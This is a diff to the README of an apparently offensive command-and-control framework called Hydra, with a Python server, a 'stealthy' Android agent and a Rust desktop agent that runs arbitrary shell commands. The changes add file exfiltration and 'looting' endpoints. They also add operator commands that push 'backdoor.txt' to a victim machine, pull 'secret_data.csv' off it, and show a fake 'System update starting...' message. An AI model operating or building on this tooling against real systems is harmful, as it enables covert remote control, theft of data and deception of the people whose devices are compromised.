@@ -34,6 +34,7 @@ The use of this framework for attacking targets without prior mutual consent is 
 * [x] Persistent Task Database (Task Queuing per ID)
 * [x] Remote Shell Execution (Desktop Head)
 * [x] Multi-Platform Telemetry (RAM, OS, Battery, Network SSID)
+* [x] File Infiltration & Exfiltration (Download/Upload)
 * [ ] Persistence Module (Systemd/Registry)
 
 ---
@@ -49,6 +50,7 @@ The brain of the operation, built with **Python & FastAPI**.
 * **Automated Tracking:** SQLite database tracking for all "Heads."
 * **Command Dispatcher:** Sends platform-specific JSON payloads.
 * **Output Collector:** Receives and logs remote shell results via `/report`.
+* **File Manager**: Dedicated endpoints for /upload (Exfiltration) and /download (Looting).
 * **Path:** `/hydra_c2/`
 
 ### 📱 Android Head
@@ -62,7 +64,7 @@ A stealthy background service built with **Kotlin**.
 * **Action Execution:** Trigger hardware actions (e.g., Vibrator) via C2.
 * **Path:** `/hydra_android/`
 
-### 💻 Desktop Head (The "Great Talon")
+### 💻 Desktop Head 
 
 A high-performance, lightweight agent built with **Rust**.
 
@@ -70,6 +72,7 @@ A high-performance, lightweight agent built with **Rust**.
 * **Runtime:** Powered by `Tokio` for non-blocking async operations.
 * **Telemetry:** Gathers Hostname, OS version, and RAM details via `sysinfo`.
 * **Shell Executor:** Executes arbitrary commands via `sh -c` and returns output.
+* **File Transfer**: Built-in support for multipart file uploads and binary downloads.
 * **Path:** `/hydra_desktop/`
 
 ---
@@ -117,6 +120,23 @@ python commander.py DESKTOP-HEAD-ALPHA shell "whoami && uptime"
 
 ```bash
 python commander.py ANDROID-HEAD-01 vibrate 2500
+
+```
+**File Download (Infiltrate)(Desktop):**
+```bash
+python commander.py DESKTOP-HEAD-ALPHA download backdoor.txt
+
+```
+
+**File Upload (Exfiltrate)(Desktop):**
+```bash
+python commander.py DESKTOP-HEAD-ALPHA upload secret_data.csv
+
+```
+
+**Send system Message (Desktop/Android):**
+```bash
+python commander.py DESKTOP-HEAD-ALPHA msg "System update starting..."
 
 ```
 
